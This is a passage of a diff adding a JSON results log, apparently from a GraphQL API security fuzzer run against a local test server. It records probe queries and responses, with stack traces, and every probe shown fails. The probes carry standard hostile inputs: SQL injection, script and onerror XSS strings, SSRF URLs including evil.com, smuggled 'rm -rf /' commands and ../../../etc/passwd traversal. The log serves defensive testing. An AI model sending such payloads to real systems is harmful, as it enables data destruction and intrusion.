+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"404\") {\n    id\n    nAmE \n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.013,
+    "timestamp": "2025-10-05T16:47:52.539315Z",
+    "count": 98,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nAmE\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nAmE\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:47:57.622961Z",
+    "count": 99,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1'; SELECT SLEEP(5); --\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:47:59.140830Z",
+    "count": 100,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:48:01.454801Z",
+    "count": 101,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://localhost:8080/admin\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:48:03.242169Z",
+    "count": 102,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1; rm -rf /; echo\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:48:04.765687Z",
+    "count": 103,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:48:06.956596Z",
+    "count": 104,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<img src=x onerror=alert('HTML_Injection')>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:48:09.276347Z",
+    "count": 105,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocationQuery {\n  getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:48:11.772377Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:48:11.776812Z",
+        "response_body": {
+          "data": {
+            "lg": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 106,
+    "timestamp": "2025-10-05T16:48:11.776829Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  lg: getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:48:14.661112Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:48:14.666637Z",
+        "response_body": {
+          "data": {
+            "lg": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 107,
+    "timestamp": "2025-10-05T16:48:14.666677Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    queryType {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:48:16.747730Z",
+    "count": 108,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"queryType\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"queryType\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    naame\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:48:18.461912Z",
+    "count": 109,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"location-1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T18:01:27.467526Z",
+    "count": 110,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": {
+          "id": "location-1",
+          "name": "New York City"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"location-1' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T18:01:29.169504Z",
+    "count": 111,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('xss')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T18:01:31.766482Z",
+    "count": 112,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://evil.com/data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T18:01:34.220308Z",
+    "count": 113,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T18:01:37.114138Z",
+    "count": 114,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T18:01:40.032405Z",
+    "count": 115,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<b>Bold Text</b>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T18:01:42.118668Z",
+    "count": 116,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getLocation(locationID: \"location-3\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T18:01:43.862993Z",
+        "response_body": {
+          "data": {
+            "getLocation": {
+              "id": "location-3",
+              "name": "Paris"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T18:01:43.869147Z",
+        "response_body": {
+          "data": {
+            "locationAlias": {
+              "id": "location-3",
+              "name": "Paris"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 117,
+    "timestamp": "2025-10-05T18:01:43.869195Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.008,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  locationAlias: getLocation(locationID: \"location-3\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T18:01:46.627399Z",
+        "response_body": {
+          "data": {
+            "getLocation": {
+              "id": "location-3",
+              "name": "Paris"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T18:01:46.632404Z",
+        "response_body": {
+          "data": {
+            "locationAlias": {
+              "id": "location-3",
+              "name": "Paris"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 118,
+    "timestamp": "2025-10-05T18:01:46.632445Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T18:01:48.190184Z",
+    "count": 119,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
